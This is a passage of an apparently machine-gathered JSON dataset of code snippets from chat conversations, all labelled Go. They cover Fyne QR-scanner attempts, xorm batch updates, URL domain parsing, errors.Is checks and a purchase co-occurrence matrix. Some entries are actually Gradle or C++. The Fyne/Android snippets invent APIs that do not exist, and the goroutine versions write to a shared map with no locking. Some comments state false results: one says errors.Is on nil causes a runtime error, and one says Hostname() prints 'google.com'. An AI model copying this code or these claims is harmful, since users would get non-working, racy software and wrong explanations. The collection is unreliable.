    "filename": "2465203cf4ac38de0b64ae54299d6b9f_5.go"
  },
  {
    "conversation_hash": "39649d0f3001c1845cd2ad31f5c80120",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        ...\n    }\n    dependencies {\n        ...\n        classpath 'com.google.dagger:hilt-android-gradle-plugin:2.42'\n    }\n}",
    "filename": "39649d0f3001c1845cd2ad31f5c80120_3.go"
  },
  {
    "conversation_hash": "39649d0f3001c1845cd2ad31f5c80120",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    ...\n    id 'kotlin-kapt'\n    id 'dagger.hilt.android.plugin'\n}\n\ndependencies {\n    ...\n    implementation \"com.google.dagger:hilt-android:2.42\"\n    kapt \"com.google.dagger:hilt-android-compiler:2.42\"\n}",
    "filename": "39649d0f3001c1845cd2ad31f5c80120_4.go"
  },
  {
    "conversation_hash": "b4cb1a6c17fd45c0823844c12fe10e6e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/fyne-io/fyne/app\"\n    \"github.com/fyne-io/fyne/dialog\"\n    \"github.com/fyne-io/fyne/widget\"\n    \"github.com/fyne-io/fyne\"\n    \"github.com/tuotoo/qrcode\"\n    \"github.com/go-gl/glfw/v3.3/glfw\"\n    \"github.com/skip2/go-qrcode\"\n)\n\nfunc main() {\n    a := app.New()\n\n    // Create a new label widget to show the results of the QR code scan\n    resultLabel := widget.NewLabel(\"Scan QR code\")\n\n    // Create a new button widget to trigger the QR code scan\n    scanButton := widget.NewButton(\"Scan QR code\", func() {\n        // Request camera permission\n        fyne.CurrentApp().Driver().Canvas().(glfw.Window).GetFramebufferSize()\n        // Start the camera preview and QR code scanning\n        scanner, err := qrcode.NewScanner()\n        if err != nil {\n            dialog.ShowError(err, a)\n            return\n        }\n        if err := scanner.Start(); err != nil {\n            dialog.ShowError(err, a)\n            return\n        }\n        defer scanner.Stop()\n\n        // Wait for the QR code to be scanned\n        for {\n            select {\n            case <-scanner.Done():\n                // Display the scanned data on the result label widget\n                resultLabel.SetText(scanner.Results()[0].Data)\n                return\n            }\n        }\n    })\n\n    // Create a new window and set its content to a vertical box containing\n    // the label and button widgets\n    w := a.NewWindow(\"QR Code Scanner\")\n    w.SetContent(widget.NewVBox(\n        resultLabel,\n        scanButton,\n    ))\n\n    // Show the window and start the app\n    w.ShowAndRun()\n}",
    "filename": "b4cb1a6c17fd45c0823844c12fe10e6e_0.go"
  },
  {
    "conversation_hash": "b4cb1a6c17fd45c0823844c12fe10e6e",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n    \"github.com/fyne-io/fyne/app\"\n    \"github.com/fyne-io/fyne/dialog\"\n    \"github.com/fyne-io/fyne/widget\"\n    \"github.com/fyne-io/fyne\"\n    \"fmt\"\n    \"runtime\"\n)\n\nfunc main() {\n    a := app.New()\n\n    // Create a new label widget to show the results of the QR code scan\n    resultLabel := widget.NewLabel(\"Scan QR code\")\n\n    // Create a new button widget to trigger the QR code scan\n    scanButton := widget.NewButton(\"Scan QR code\", func() {\n        err := a.RunOnMainThread(func() {\n            // Get the Java window handle from the Fyne application\n            jWindow := fyne.CurrentApp().Driver().Canvas().(fyne.Window).Canvas().(fyne.Window).Handle()\n\n            // Call the Java QR code scanning code on a separate thread\n            runtime.LockOSThread()\n            defer runtime.UnlockOSThread()\n            if err := jWindow.Call(\"startScanning\", resultLabel); err != nil {\n                dialog.ShowError(fmt.Errorf(\"Failed to start scanning: %v\", err), a)\n                return\n            }\n        })\n        if err != nil {\n            dialog.ShowError(fmt.Errorf(\"Failed to run on main thread: %v\", err), a)\n        }\n    })\n\n    // Create a new window and set its content to a vertical box containing\n    // the label and button widgets\n    w := a.NewWindow(\"QR Code Scanner\")\n    w.SetContent(widget.NewVBox(\n        resultLabel,\n        scanButton,\n    ))\n\n    // Show the window and start the app\n    w.ShowAndRun()\n}",
    "filename": "b4cb1a6c17fd45c0823844c12fe10e6e_1.go"
  },
  {
    "conversation_hash": "89d7fa1fc8d2103fda21a26b6a29559c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package mobile\n\nimport (\n\t_ \"embed\"\n\t\"fmt\"\n)\n\n//go:embed qrscanner.aar\nvar qrScannerAAR []byte\n\ntype QRScanner interface {\n\tScanQRCode() (string, error)\n}\n\nfunc GetScanner() QRScanner {\n\tscanner, err := newQRScanner()\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\treturn scanner\n}",
    "filename": "89d7fa1fc8d2103fda21a26b6a29559c_0.go"
  },
  {
    "conversation_hash": "89d7fa1fc8d2103fda21a26b6a29559c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//+build android\n\npackage mobile\n\nimport (\n\t\"Java/android/hardware/Camera\"\n\t\"golang.org/x/mobile/bind/java\"\n)\n\ntype qrScannerImpl struct{}\n\nfunc newQRScanner() (QRScanner, error) {\n\treturn qrScannerImpl{}, nil\n}\n\nfunc (s qrScannerImpl) ScanQRCode() (string, error) {\n\t// Set up the camera and start scanning\n\tcamera := Camera.GetCameraInstance()\n\tif camera == nil {\n\t\treturn \"\", errors.New(\"unable to access camera\")\n\t}\n\t// Implement the required Java calling components for scanning\n\n\t// Here is an example using the ZXing decoding library\n\t// https://github.com/zxing/zxing\n\t// The real implementation should configure the camera and start the scan.\n\t// This is only an example\n\tscanner := java.NewScanner()\n\tcamera.SetPreviewCallback(scanner)\n\tcamera.StartPreview()\n\tdefer camera.Release()\n\n\treturn scanner.getResult(timeout)\n}",
    "filename": "89d7fa1fc8d2103fda21a26b6a29559c_1.go"
  },
  {
    "conversation_hash": "89d7fa1fc8d2103fda21a26b6a29559c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tapp := fyne.NewApp()\n\tw := app.NewWindow(\"QR Scanner\")\n\n\tqrScanner := mobile.GetScanner()\n\n\tqrBtn := widget.NewButton(\"Scan QR Code\", func() {\n\t\tresult, err := qrScanner.ScanQRCode()\n\t\tif err != nil {\n\t\t\tlog.Println(\"Failed to scan QR code: \", err)\n\t\t\treturn\n\t\t}\n\t\tlog.Printf(\"Scanned QR code result: %s\", result)\n\t})\n\n\tw.SetContent(qrBtn)\n\tw.ShowAndRun()\n}",
    "filename": "89d7fa1fc8d2103fda21a26b6a29559c_2.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func newApp() {\n    return &fyne.App{\n        Name: \"QR Code Scanner\",\n        Driver: func() fyne.Driver {\n            if fd, ok := fyne.CurrentApp().Driver().(fyne.MobileDriver); ok {\n                return &myDriver{fd}\n            }\n            return fyne.CurrentApp().Driver()\n        },\n    }\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_0.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type myDriver struct {\n    fyne.MobileDriver\n    ctx    android.Context\n    camera android.JavaObject // Camera Java class\n    callback android.JavaObject // CameraCallback Java class\n    surface android.JavaObject // Surface Java class\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_1.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type CameraCallback struct {\n    surface  android.JavaObject\n    callback android.JavaObject\n}\n\nfunc WidgetCameraPreviewCallback(surface android.JavaObject, callback android.JavaObject) CameraCallback {\n    return CameraCallback{\n        surface:  surface,\n        callback: callback,\n    }\n}\n\nfunc (c CameraCallback) Call(args ...interface{}) {\n    go func() {\n        data, _ := GetQRCodeFromCamera(c.surface)\n        fyne.CurrentApp().SendEvent(myEvent{data: data})\n    }()\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_3.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 4,
    "language": "Go",
    "libraries": [
      "different"
    ],
    "code": "type Event interface {\n    Update() // might be called from different goroutines\n}\n\ntype myEvent struct {\n    data string\n}\n\nfunc (e myEvent) Update() {\n    fmt.Println(\"QR Code:\", e.data)\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_4.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func newWindow(w fyne.Window) {\n    scanner := &cameraScanner{\n        title:   w,\n        qrImage: widget.NewIcon(resourceQrCodePng),\n    }\n    scanner.wrap = fyne.NewContainer(\n        scanner.qrImage,\n        widget.NewLabelWithStyle(\"Scan a QR code\", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),\n    )\n\n    if err := scanner.OpenCamera(); err != nil {\n        log.Println(\"Failed to start camera:\", err)\n    }\n    fyne.CurrentApp().Driver().CanvasForObject(scanner.wrap).AddChild(scanner.canvas)\n\n    scanner.Ready(&myEvent{})\n}\n\ntype cameraScanner struct {\n    wrap     *fyne.Container\n    qrImage  *widget.Icon\n    canvas   *fyne.Container\n    title    fyne.Window\n    callback fyne.OnClosed\n\n    event Event\n}\n\nfunc (s *cameraScanner) OpenCamera() error {\n    return fyne.CurrentApp().Driver().(cameraScannDriver).OpenCamera()\n}\n\nfunc (s *cameraScanner) Ready(event Event) {\n    s.event = event\n}\n\nfunc (s *cameraScanner) Event() Event {\n    return s.event\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_5.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func newApp() fyne.App {\n    return fyne.CurrentApp()\n}\n\nfunc newDriver() fyne.Driver {\n    if driver, ok := fyne.CurrentApp().Driver().(fyne.MobileDriver); ok {\n        return &myDriver{driver}\n    }\n    return nil // 或者返回 fyne.CurrentApp().Driver()\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_6.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "type myDriver struct {\n    fyne.MobileDriver\n    camera android.JavaObject // Camera Java class\n    ctx android.Context\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_7.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func (d *myDriver) OpenCamera() error {\n    activity := android.MainActivity()\n    if !android.PermissionRelated([]string{android.PermissionCamera}).Granted() {\n        android.PermissionRelated([]string{android.PermissionCamera}).Request()\n        return nil\n    }\n    cameraManager := activity.GetSystemService(android.ContextCameraService).(android.JavaObject)\n    cameraIds := cameraManager.CallObjectMethod(\"getCameraIdList\").([]java.String)\n\n    for _, id := range cameraIds {\n        info := cameraManager.CallObjectMethod(\"getCameraCharacteristics\", id).(android.JavaObject)\n        facing := info.CallObjectMethod(\"get\", android.ExistString(\"LENS_FACING\", android.CameraCharacteristics)).(java.Integer)\n        if facing == android.CameraCharacteristicsLensFacingFront {\n            continue\n        }\n        camera, err := android.CameraOpen(id, d.ctx.(android.ContextWrapper))\n        if err != nil {\n            continue\n        }\n        parameters := camera.GetParameters().Clone().(android.CameraParameters)\n        parameters.SetPreviewSize(640, 480)\n        parameters.SetJpegQuality(100)\n        parameters.SetJpegThumbnailQuality(100)\n        camera.SetParameters(parameters)\n        surfaceHolder := android.MainActivity().CallObjectMethod(\"getSystemService\", android.ExistString(\"WINDOW_SERVICE\", android.ContextWindowService)).(android.JavaObject).CallObjectMethod(\"getDefaultDisplay\").CallObjectMethod(\"getSurface\").CallObjectMethod(\"getHolder\")\n        camera.BeginPreviewWithCallback(surfaceHolder, &SurfaceHolderCallback{Driver: d})\n        d.camera = camera\n        return nil\n    }\n    return errors.New(\"No rear camera found\")\n}\n\nfunc (d *myDriver) CloseCamera() error {\n    if d.camera != nil {\n        d.camera.StopPreview()\n        d.camera.Release()\n    }\n    return nil\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_8.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "type SurfaceHolderCallback struct {\n    *fyne.Container\n    Driver    *myDriver\n    previewW  int\n    previewH  int\n}\n\nfunc (s *SurfaceHolderCallback) SurfaceCreated(holder android.JavaObject) {\n}\n\nfunc (s *SurfaceHolderCallback) SurfaceDestroyed(holder android.JavaObject) {\n}\n\nfunc GetQRCodeFromCamera(surface android.JavaObject) (string, error) {\n    width, height := surface.CallMethod(\"getWidth\").(int), surface.CallMethod(\"getHeight\").(int)\n    yuvImage := android.NewYuvImage(surface.GetBuffer(), android.ImageFormatNV21, width, height, nil)\n    bounds := surface.CallMethod(\"getSurfaceFrame\").(android.Rect)\n    rowStride := surface.CallMethod(\"getBuffer\").CallMethod(\"getRowStride\").(int)\n\n    var buffer []byte\n    if _, err := yuvImage.CompressToJpeg(bounds, 100, &buffer); err != nil {\n        return \"\", err\n    }\n\n    img, err := qrcode.Decode(bytes.NewReader(buffer))\n    if err != nil {\n        return \"\", err\n    }\n    return img.Content, nil\n}\n\nfunc (s *SurfaceHolderCallback) SurfaceChanged(holder android.JavaObject, format int, width int, height int) {\n    if s.previewW != 0 || s.previewH != 0 {\n        return\n    }\n    s.previewW, s.previewH = width, height\n\n    go func() {\n        for {\n            data, err := GetQRCodeFromCamera(holder)\n            if err == nil {\n                fyne.CurrentApp().SendEvent(myEvent{data: data})\n            }\n            time.Sleep(100 * time.Millisecond)\n        }\n    }()\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_9.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 10,
    "language": "Go",
    "libraries": [
      "different"
    ],
    "code": "type Event interface {\n    Update() // might be called from different goroutines\n}\n\ntype myEvent struct {\n    data string\n}\n\nfunc (e myEvent) Update() {\n    fmt.Println(\"QR Code:\", e.data)\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_10.go"
  },
  {
    "conversation_hash": "2c90f1fe4ad24314e235df99688ec6ff",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "func newWindow(w fyne.Window) {\n    scanner := &cameraScanner{\n        title:   w,\n        qrImage: widget.NewIconFromResource(resourceQrCodePng),\n    }\n    scanner.wrap = fyne.NewContainer(\n        scanner.qrImage,\n        widget.NewLabelWithStyle(\"Scan a QR code\", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),\n    )\n\n    if err := scanner.OpenCamera(); err != nil {\n        log.Println(\"Failed to start camera:\", err)\n    }\n    fyne.CurrentApp().Driver().CanvasForObject(scanner.wrap).AddChild(scanner.canvas)\n\n    scanner.Ready(&myEvent{})\n}\n\ntype cameraScanner struct {\n    wrap     *fyne.Container\n    qrImage  *widget.Icon\n    canvas   *fyne.Container\n    title    fyne.Window\n    callback fyne.OnClosed\n\n    event Event\n}\n\nfunc (s *cameraScanner) OpenCamera() error {\n    return fyne.CurrentApp().Driver().(cameraScannDriver).OpenCamera()\n}\n\nfunc (s *cameraScanner) Ready(event Event) {\n    s.event = event\n}\n\nfunc (s *cameraScanner) Event() Event {\n    return s.event\n}",
    "filename": "2c90f1fe4ad24314e235df99688ec6ff_11.go"
  },
  {
    "conversation_hash": "18abc7ef06281982a298a3f50e3c335b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "session := engine.NewSession()\ndefer session.Close()\nerr := session.Begin()\nif err != nil {\n    //handle error\n}\n\naffected, err := session.Update(&SubdomainS{SubdomainsSclice: []string{\"new_value\"}}, &SubdomainS{MainDomain: \"main_domain_value\"})\nif err != nil {\n    //handle error\n}\n\nerr = session.Commit()\nif err != nil {\n    //handle error\n}",
    "filename": "18abc7ef06281982a298a3f50e3c335b_0.go"
  },
  {
    "conversation_hash": "18abc7ef06281982a298a3f50e3c335b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// 定义你要更新的 SubdomainS 数组\nvar subdomainList []SubdomainS\n\n// 通过代码或者其他方式为 subdomainList 赋值，这里简单方式提供示例\nsubdomainList = append(subdomainList, SubdomainS{MainDomain: \"main_domain1\", SubdomainsSclice: []string{\"subdomain1_1\", \"subdomain1_2\"}})\nsubdomainList = append(subdomainList, SubdomainS{MainDomain: \"main_domain2\", SubdomainsSclice: []string{\"subdomain2_1\", \"subdomain2_2\"}})\n\n// 开始会话\nsession := engine.NewSession()\ndefer session.Close()\n\n// 事务处理\nerr := session.Begin()\nif err != nil {\n    // 错误处理\n}\n\n// 执行批量更新操作\n_, err = session.Table(\"subdomain_s\").Replace(&subdomainList)\nif err != nil {\n    // 错误处理\n}\n\n// 提交事务\nerr = session.Commit()\nif err != nil {\n    // 错误处理\n}",
    "filename": "18abc7ef06281982a298a3f50e3c335b_1.go"
  },
  {
    "conversation_hash": "18abc7ef06281982a298a3f50e3c335b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// 定义你的 SubdomainS 对象数组，假设为 subdomainList\nvar subdomainList []SubdomainS\n\n// 开始会话\nsession := engine.NewSession()\ndefer session.Close()\n\n// 事务处理\nerr := session.Begin()\nif err != nil {\n    // 错误处理\n}\n\n// 执行批量更新操作\nsql := `REPLACE INTO subdomain_s (id, main_domain, subdomains_sclice, subdomains, task_id, org_name) VALUES (?,?,?,?,?,?)`\nfor _, item := range subdomainList {\n    _, err = session.Exec(sql, item.Id, item.MainDomain, item.SubdomainsSclice, item.Subdomains, item.TaskId, item.OrgName)\n    if err != nil {\n        // 错误处理\n    }\n}\n\n// 提交事务\nerr = session.Commit()\nif err != nil {\n    // 错误处理\n}",
    "filename": "18abc7ef06281982a298a3f50e3c335b_2.go"
  },
  {
    "conversation_hash": "18abc7ef06281982a298a3f50e3c335b",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"net/url\"\n    \"strings\"\n)\n\nfunc getMainDomain(urlStr string) (string, error) {\n    // 解析 URL\n    u, err := url.Parse(urlStr)\n    if err != nil {\n        return \"\", err\n    }\n    // 将 Host 字段分割成字符串切片\n    parts := strings.Split(u.Hostname(), \".\")\n    // 根据切片长度确定主域名\n    switch len(parts) {\n    case 1:\n        return parts[0], nil\n    case 2:\n        return strings.Join(parts, \".\"), nil\n    default:\n        return strings.Join(parts[len(parts)-2:], \".\"), nil\n    }\n}\n\n// 示例调用\nmainDomain, err := getMainDomain(\"https://www.google.com/search?q=golang&oq=golang\")\nif err != nil {\n    fmt.Println(err)\n    return\n}\nfmt.Println(mainDomain) // 输出：google.com",
    "filename": "18abc7ef06281982a298a3f50e3c335b_4.go"
  },
  {
    "conversation_hash": "18abc7ef06281982a298a3f50e3c335b",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net/url\"\n)\n\nfunc main() {\n    // 解析 URL\n    u, err := url.Parse(\"https://www.google.com/search?q=golang&oq=golang\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    // 获取主域名\n    mainDomain := u.Hostname()\n    // 输出主域名\n    fmt.Println(mainDomain) // 输出：google.com\n}",
    "filename": "18abc7ef06281982a298a3f50e3c335b_5.go"
  },
  {
    "conversation_hash": "bd53ea8e7059c6726d589d93bb713b58",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "class Derived : public Base\n{\npublic:\n    virtual void func() override {\n        // 省略基类处理的代码\n        // 在此处添加额外的处理\n        // 省略返回值\n    }\n};",
    "filename": "bd53ea8e7059c6726d589d93bb713b58_7.go"
  },
  {
    "conversation_hash": "1af5860fd81722d4b1ea2f2e1fe19e08",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "if err = doSomething(); errors.Is(err, customError) {\n   // handle specific error\n} else if err != nil {\n   // handle general error\n}",
    "filename": "1af5860fd81722d4b1ea2f2e1fe19e08_5.go"
  },
  {
    "conversation_hash": "1af5860fd81722d4b1ea2f2e1fe19e08",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "err = doSomething()\nif err != nil {\n    if errors.Is(err, customError) {\n        // handle specific error\n    } else {\n        // handle general error\n    }\n}",
    "filename": "1af5860fd81722d4b1ea2f2e1fe19e08_6.go"
  },
  {
    "conversation_hash": "1af5860fd81722d4b1ea2f2e1fe19e08",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar myErr error = nil\n\tfmt.Println(errors.Is(myErr, customError))\n}\n\nvar customError = errors.New(\"custom error\")",
    "filename": "1af5860fd81722d4b1ea2f2e1fe19e08_9.go"
  },
  {
    "conversation_hash": "1af5860fd81722d4b1ea2f2e1fe19e08",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar myErr error = nil\n\tvar result bool = errors.Is(myErr, customError) // Runtime error will occur here\n\tfmt.Println(result)\n}\n\nvar customError = errors.New(\"custom error\")",
    "filename": "1af5860fd81722d4b1ea2f2e1fe19e08_10.go"
  },
  {
    "conversation_hash": "acb7c444eff53b6c126e7da421459313",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar err error = nil\n\tif errors.Is(err, fmt.Errorf(\"some error message\")) {\n\t\tfmt.Println(\"Error found\")\n\t}\n}",
    "filename": "acb7c444eff53b6c126e7da421459313_0.go"
  },
  {
    "conversation_hash": "acb7c444eff53b6c126e7da421459313",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar err error = nil\n\tif err != nil && errors.Is(err, fmt.Errorf(\"some error message\")) {\n\t\tfmt.Println(\"Error found\")\n\t}\n}",
    "filename": "acb7c444eff53b6c126e7da421459313_1.go"
  },
  {
    "conversation_hash": "acb7c444eff53b6c126e7da421459313",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar err error\n\tif errors.Is(err, fmt.Errorf(\"some error message\")) {\n\t\tfmt.Println(\"Error found\")\n\t}\n}",
    "filename": "acb7c444eff53b6c126e7da421459313_2.go"
  },
  {
    "conversation_hash": "acb7c444eff53b6c126e7da421459313",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\terr := fmt.Errorf(\"some error message\")\n\tif errors.Is(err, fmt.Errorf(\"some error message\")) {\n\t\tfmt.Println(\"Error found\")\n\t}\n}",
    "filename": "acb7c444eff53b6c126e7da421459313_3.go"
  },
  {
    "conversation_hash": "acb7c444eff53b6c126e7da421459313",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar err error\n\tif errors.Is(err, fmt.Errorf(\"some error message\")) {\n\t\tfmt.Println(\"Error found\")\n\t} else {\n\t\tfmt.Println(\"Error not found\")\n\t}\n}",
    "filename": "acb7c444eff53b6c126e7da421459313_4.go"
  },
  {
    "conversation_hash": "3602ee6bcc9b6ac6564aa6087497d763",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type user struct {\n  purchases map[string]int // map des achats de l'utilisateur\n}\n\nfunc createCooccurrenceMatrix(users []user) map[string]map[string]int {\n  cooccurrences := make(map[string]map[string]int)\n  \n  // Parcourir tous les utilisateurs\n  for i, u1 := range users {\n    // Insérer un nouvel utilisateur dans la matrice de cooccurrences\n    cooccurrences[strconv.Itoa(i+1)] = make(map[string]int)\n\n    // Parcourir les achats de l'utilisateur\n    for p1 := range u1.purchases {\n      // Incrémenter le compteur de cooccurrences pour chaque paire de produits achetés par l'utilisateur\n      for _, u2 := range users {\n        if u1 != u2 && u2.purchases[p1] > 0 {\n          cooccurrences[strconv.Itoa(i+1)][p1]++\n          cooccurrences[strconv.Itoa(i+1)][strconv.Itoa(i+2)]++\n        }\n      }\n    }\n  }\n  \n  return cooccurrences\n}",
    "filename": "3602ee6bcc9b6ac6564aa6087497d763_0.go"
  },
  {
    "conversation_hash": "3602ee6bcc9b6ac6564aa6087497d763",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type user struct {\n  purchases []string // slice des achats de l'utilisateur\n}\n\nfunc createCooccurrenceMatrix(users []user) map[string]map[string]int {\n  cooccurrences := make(map[string]map[string]int)\n  \n  // Parcourir tous les utilisateurs\n  for i, u1 := range users {\n    // Insérer un nouvel utilisateur dans la matrice de cooccurrences\n    cooccurrences[strconv.Itoa(i+1)] = make(map[string]int)\n\n    // Parcourir les achats de l'utilisateur\n    for _, p1 := range u1.purchases {\n      // Incrémenter le compteur de cooccurrences pour chaque paire de produits achetés par l'utilisateur\n      for j := i + 1; j < len(users); j++ {\n        u2 := users[j]\n        if contains(u2.purchases, p1) {\n          cooccurrences[strconv.Itoa(i+1)][p1]++\n          cooccurrences[strconv.Itoa(i+1)][strconv.Itoa(j+1)]++\n          cooccurrences[strconv.Itoa(j+1)][p1]++\n          cooccurrences[strconv.Itoa(j+1)][strconv.Itoa(i+1)]++\n        }\n      }\n    }\n  }\n\n  return cooccurrences\n}\n\nfunc contains(s []string, e string) bool {\n  for _, a := range s {\n    if a == e {\n      return true\n    }\n  }\n  return false\n}",
    "filename": "3602ee6bcc9b6ac6564aa6087497d763_1.go"
  },
  {
    "conversation_hash": "3602ee6bcc9b6ac6564aa6087497d763",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type user struct {\n  purchases []string // slice des achats de l'utilisateur\n}\n\nfunc createCooccurrenceMatrix(users []user) map[string]map[string]int {\n  cooccurrences := make(map[string]map[string]int)\n  n := len(users)\n\n  // Initialiser les canaux\n  ch := make(chan map[string]int, n)\n  done := make(chan bool)\n\n  // Lancer chaque goroutine\n  for i, u1 := range users {\n    go func(i int, u1 user) {\n      // Insérer un nouvel utilisateur dans la matrice de cooccurrences\n      cooccurrences[strconv.Itoa(i+1)] = make(map[string]int)\n\n      // Parcourir les achats de l'utilisateur\n      for _, p1 := range u1.purchases {\n        // Incrémenter le compteur de cooccurrences pour chaque paire de produits achetés par l'utilisateur\n        for j := i + 1; j < n; j++ {\n          u2 := users[j]\n          if contains(u2.purchases, p1) {\n            cooccurrences[strconv.Itoa(i+1)][p1]++\n            cooccurrences[strconv.Itoa(i+1)][strconv.Itoa(j+1)]++\n            cooccurrences[strconv.Itoa(j+1)][p1]++\n            cooccurrences[strconv.Itoa(j+1)][strconv.Itoa(i+1)]++\n          }\n        }\n      }\n\n      ch <- cooccurrences[strconv.Itoa(i+1)]\n    }(i, u1)\n  }\n\n  // Collecter les résultats des goroutines\n  go func() {\n    for i := 0; i < n; i++ {\n      m := <-ch\n      for k, v := range m {\n        cooccurrences[k][strconv.Itoa(i+1)] = v\n      }\n    }\n    done <- true\n  }()\n\n  // Attendre la fin du traitement\n  <-done\n\n  return cooccurrences\n}\n\nfunc contains(s []string, e string) bool {\n  for _, a := range s {\n    if a == e {\n      return true\n    }\n  }\n  return false\n}",
    "filename": "3602ee6bcc9b6ac6564aa6087497d763_2.go"
  },
  {
    "conversation_hash": "3602ee6bcc9b6ac6564aa6087497d763",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func createCooccurrenceMatrix(users []user) map[string]map[string]int {\n  cooccurrences := make(map[string]map[string]int)\n\n  ch := make(chan [2]int)\n  for i, u1 := range users {\n    cooccurrences[strconv.Itoa(i+1)] = make(map[string]int)\n    go func(i int, u1 user) {\n      for j, u2 := range users {\n        if j > i {\n          ch <- [2]int{i, j}\n        }\n      }\n    }(i, u1)\n  }\n\n  done := make(chan bool)\n  for i := 0; i < cap(ch); i++ {\n    go func() {\n      for pair := range ch {\n        i, j := pair[0], pair[1]\n        u1, u2 := users[i], users[j]\n        for _, p1 := range u1.purchases {\n          if contains(u2.purchases, p1) {\n            cooccurrences[strconv.Itoa(i+1)][p1]++\n            cooccurrences[strconv.Itoa(i+1)][strconv.Itoa(j+1)]++\n            cooccurrences[strconv.Itoa(j+1)][p1]++\n            cooccurrences[strconv.Itoa(j+1)][strconv.Itoa(i+1)]++\n          }\n        }\n      }\n      done <- true\n    }()\n  }\n\n  for i := 0; i < cap(ch); i++ {\n    <-done\n  }\n\n  return cooccurrences\n}",
    "filename": "3602ee6bcc9b6ac6564aa6087497d763_3.go"
  },
  {
    "conversation_hash": "2c39241821c0eabcf8e76e27e3a87faf",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
